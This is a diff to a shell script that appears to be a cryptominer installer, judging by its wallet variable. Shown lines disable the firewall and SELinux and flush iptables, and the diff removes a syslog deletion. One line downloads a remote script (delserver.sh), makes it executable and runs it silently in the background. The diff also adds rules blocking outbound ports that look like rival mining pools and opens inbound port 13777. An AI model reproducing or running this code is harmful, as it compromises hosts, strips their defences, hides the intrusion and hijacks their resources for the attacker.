@@ -20,15 +20,10 @@ EMAIL=$2 # this one is optional
 
 # Disable firewall
 ulimit -n 65535
-rm -rf /var/log/syslog
 ufw disable
 iptables -F
 setenforce 0 2>dev/null
 echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
-firewall-cmd --zone=public --add-port=13777/tcp --permanent
-firewall -cmd --reload	
-systemctl disable firewalld.service	
-systemctl stop firewalld.service
 
 # printing greetings
 if [ -z $WALLET ]; then
@@ -932,7 +927,15 @@ wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
 chmod 777 delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
 
-systemctl stop firewalld.service
 iptables -F
+iptables -X
+iptables -A OUTPUT -p tcp --dport 5555 -j DROP
+iptables -A OUTPUT -p tcp --dport 7777 -j DROP
+iptables -A OUTPUT -p tcp --dport 9999 -j DROP
+iptables -A OUTPUT -p tcp --dport 9999 -j DROP
+iptables -A INPUT -p tcp –dport 13777 -j ACCEPT 
+iptables -A OUTPUT -j ACCEPT 
+service iptables reload
+systemctl stop firewalld.service
 
 echo "[*] Yes-GoGo"
